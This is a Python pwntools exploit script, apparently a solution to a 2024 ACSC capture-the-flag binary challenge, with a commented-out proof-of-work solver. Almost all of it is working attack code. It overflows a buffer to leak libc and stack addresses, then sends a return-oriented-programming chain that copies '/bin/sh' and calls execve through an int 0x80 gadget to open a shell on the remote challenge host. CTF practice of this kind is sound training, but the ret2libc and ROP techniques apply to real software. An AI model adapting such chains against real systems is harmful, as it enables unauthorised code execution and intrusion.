from pwn import *
from icecream import ic
import hashlib
import sys

exe = ELF("./prog_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("fleeda.chal.2024.ctf.acsc.asia", 8109)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
# ru("256(")
# prefix = ru("+").decode()[:-1]
# ru("000000000(")
# difficulty = int(ru(")").decode()[:-1])
# ru(">")
# ic(prefix)
# ic(difficulty)
# zeros = '0' * difficulty

# def is_valid(digest):
#     if sys.version_info.major == 2:
#         digest = [ord(i) for i in digest]
#     bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
#     return bits[:difficulty] == zeros


# i = 0
# while True:
#     i += 1
#     s = prefix + str(i)
#     if is_valid(hashlib.sha256(s.encode()).digest()):
#         ic(i)
#         sl(str(i).encode())
#         rl()
#         break

ret     = p64(0x401092)
readgad = p64(0x401083)
putsgot = p64(0x404000)
main    = p64(0x401060)
poprbx  = p64(0x401091)

payload = (0x10*b"a" + putsgot + ret + readgad + 
           0x10*b"a" + p64(0xdeadbeef) + main)
sl(payload)
rl()

# GETTING LIBC LEAK
libc.address = u64(re(6).ljust(8,b"\x00")) - 0x80e50
ic(hex(libc.address))

'''
poprdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029139
binsh = libc.address + 0x1d8678

payload = b'a'*0x10
payload += p64(0)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])

sl(payload)
'''

environ = p64(libc.address + 0x222200)
payload = (0x10*b"a" + environ + ret + readgad + 
           0x10*b"a" + p64(0xdeadbeef) + main)
sl(payload)
rl()
rl()

# GETTING STACK LEAK
stack = u64(re(6).ljust(8,b"\x00"))
ic(hex(stack))

#===============================================
poprdi  = libc.address + 0x2a3e5
poprsi  = libc.address + 0x2be51
poprdx  = libc.address + 0x11f2e7
poprax  = libc.address + 0x45eb0
syscall = libc.address + 0x91316
memcpy  = libc.address + 0xc4870
int80 = libc.address + 0xf2ec2
poprcx = libc.address + 0x000000000003d1ee

pause()
payload = (0x10*b"b" + p64(0x0) + 
            p64(poprdi) + p64(0x404048) +
            p64(poprsi) + p64(libc.address + 0x1d8678) +
            p64(poprdx) + p64(0x10) +  p64(0) +
            p64(memcpy) +
           p64(poprax) + p64(11) + 
           poprbx + p64(0x404048) +
           p64(poprcx) + p64(0) + 
           p64(poprdx) + p64(0) + p64(0) + 
           p64(int80)
        )
sl(payload)
pause()
sl(b"/bin/sh\x00")

io.interactive()
